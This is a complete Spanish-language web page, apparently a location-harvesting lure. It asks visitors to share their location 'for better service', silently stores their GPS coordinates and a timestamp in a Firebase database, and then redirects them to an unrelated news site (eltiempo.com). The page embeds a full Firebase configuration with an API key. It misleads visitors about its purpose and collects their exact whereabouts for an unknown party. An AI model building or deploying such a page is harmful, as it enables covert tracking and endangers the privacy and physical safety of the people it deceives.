<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ubicación Inteligente</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDHb3MkiF8XDjweNYBazE08sETyF-Yuy0s",
      authDomain: "base-de-datos-clientes-ea806.firebaseapp.com",
      databaseURL: "https://base-de-datos-clientes-ea806-default-rtdb.firebaseio.com",
      projectId: "base-de-datos-clientes-ea806",
      storageBucket: "base-de-datos-clientes-ea806.firebasestorage.app",
      messagingSenderId: "711168578601",
      appId: "1:711168578601:web:2f4784c0382f63376ff838"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    function solicitarUbicacion() {
      if (!navigator.geolocation) {
        alert("Tu navegador no admite geolocalización.");
        return;
      }

      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
        if (result.state === 'denied') {
          alert("Debes habilitar los permisos de ubicación en tu navegador.");
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const datos = {
              latitud: position.coords.latitude,
              longitud: position.coords.longitude,
              timestamp: new Date().toISOString()
            };
            const refUbicaciones = push(ref(db, 'ubicaciones'));
            set(refUbicaciones, datos).then(() => {
              window.location.href = "https://www.eltiempo.com";
            }).catch(err => {
              alert("Error al guardar ubicación en Firebase: " + err.message);
            });
          },
          (error) => {
            if (error.code === error.PERMISSION_DENIED) {
              alert("Debes permitir el acceso a tu ubicación para continuar.");
            } else {
              alert("Error al obtener la ubicación: " + error.message);
            }
          }
        );
      });
    }

    window.onload = () => {
      document.getElementById("aceptarBtn").addEventListener("click", solicitarUbicacion);
    };
  </script>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    .contenedor {
      background: #ffffff;
      color: #333;
      padding: 40px 30px;
      border-radius: 16px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    h2 { margin-bottom: 10px; font-size: 24px; }
    p { margin-bottom: 30px; font-size: 16px; }
    button {
      background-color: #2a5298;
      color: white;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #1e3c72;
    }
    @media (max-width: 480px) {
      .contenedor { padding: 30px 20px; }
      h2 { font-size: 20px; }
      p { font-size: 14px; }
      button { width: 100%; }
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <h2>¿Deseas compartir tu ubicación?</h2>
    <p>Activa los permisos para brindarte un mejor servicio.</p>
    <button id="aceptarBtn">Compartir ubicación</button>
  </div>
</body>
</html>
